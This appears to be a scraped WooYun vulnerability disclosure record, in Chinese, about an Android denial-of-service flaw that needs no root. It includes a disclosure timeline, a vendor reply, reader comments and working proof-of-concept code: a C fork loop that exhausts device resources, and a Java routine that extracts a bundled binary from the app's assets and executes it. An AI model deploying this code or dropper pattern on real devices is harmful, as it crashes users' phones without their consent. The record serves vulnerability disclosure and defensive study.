{"id": 67146, "wybug_id": "wooyun-2015-0132485", "wybug_title": "无需root权限恶意apk可导致安卓系统DOS", "wybug_corp": "谷歌", "wybug_author": "成王败寇", "wybug_date": "2015-08-13 13:57", "wybug_open_date": "2015-11-12 16:06", "wybug_type": "拒绝服务", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安卓", "拒绝服务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-14：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-08-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向公众公开  简要描述： 利用该漏洞的恶意APK程序，无需root权限即可使手机呆掉或导致异常重启，测试部分机型连电源键都无响应（三星S5、HTC刷CM10），只能扣电池……。影响系统范围目前只测试过安卓4.0以上，包括5.1.1及最新版M系统。 详细说明：  该漏洞由系统级Race Condition引起，主要利用暴力fork子进程的方式打开设备文件并占用，由于多个系统级lib共享库对于资源申请失败处理流程不当，引发整个安卓系统进程以雪崩的方式结束，从而DOS安卓系统，整个过程无需root权限，也不需要申请任何敏感权限。   漏洞证明：  \nPOC代码说明：首先使用NDK编译native部分C代码，然后由java部分负责释放并运行native程序trigger漏洞。native部分C代码：<code>int main(int argc, char **argv, char **env){\twhile(1)\t{\t\tfork();\t\topen(\"/dev/random\",O_RDONLY);\t}\treturn 0;}\njava部分负责释放并运行native程序：\nvoid ReleaseBinAndRun() {\t\tAssetManager aManager = getAssets();\t\tApplicationInfo appInfo = this.getApplicationInfo();\t\t\t\ttry {\t\t\tInputStream in = aManager.open(\"RaceCondition\");\t\t\tboolean bSuscess = true;\t\t\tString path = getFilesDir().getPath();\t\t\tpath = path.substring(0, path.lastIndexOf(\"/\", path.length() - 1));\t\t\tFile file = new File(path, \"e\");\t\t\t// delete old file\t\t\t\t\t\tif (!file.exists())\t\t\t\tbSuscess = file.createNewFile();\t\t\t\tfile.setExecutable(true, false);\t\t\tFileOutputStream out = new FileOutputStream(file);\t\t\tint c;\t\t\tbyte buffer[] = new byte[1024];\t\t\twhile ((c = in.read(buffer)) != -1) {\t\t\t\tfor (int i = 0; i < c; i++)\t\t\t\t\tout.write(buffer[i]);\t\t\t}\t\t\tin.close();\t\t\tout.close();\t\t\tRuntime.getRuntime().exec(file.getAbsolutePath());\t\t\t// RootUtils.RootCommand(\"\" + file.getAbsolutePath());\t\t} catch (Exception e) {\t\t\t// TODO: handle exception\t\t\t\t\t\te.printStackTrace();\t\t}\t}\n</code>   修复方案：  为系统关键进程保留足够的资源。进程在申请资源失败后的处理流程需优化。   版权声明：转载请注明来源 成王败寇@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-08-14 16:04 厂商回复： CNVD确认所述情况，已经由CNVD通过网站公开联系方式（或以往建立的处置渠道）向网站管理单位（软件生产厂商）通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-11 14:51 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:493 漏洞数:71        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  @xsser @疯狗 http://www.droidsec.cn/%E8%B6%8B%E5%8A%BF%E7%A7%91%E6%8A%80%E5%8F%91%E7%8E%B0%E5%8F%AF%E9%80%A0%E6%88%90android%E7%B3%BB%E7%BB%9F%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E/ 和这个有啥区别，直接把新闻复制一遍？    \n     2015-08-11 14:52 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:493 漏洞数:71        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  趋势科技发现可造成Android系统崩溃漏洞 安卓漏洞攻防 BY DROIDSEC大意：影响android4.3及以上版本，目前还没有补丁，可以通过本地和远程播放视频文件触发，原理和之前的 Stagefright 组件类似，漏洞位于Mediaserver服务，其无法正确处理Matroska格式封装的多媒体文件（通常为MKV）造成crash，属于Integer Overflow漏洞。造成的效果就是系统无响应，黑屏，无法打接电话，不过也没微博说的变砖那么严重，google给的是低危，系统无响应后强行重启就行了。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}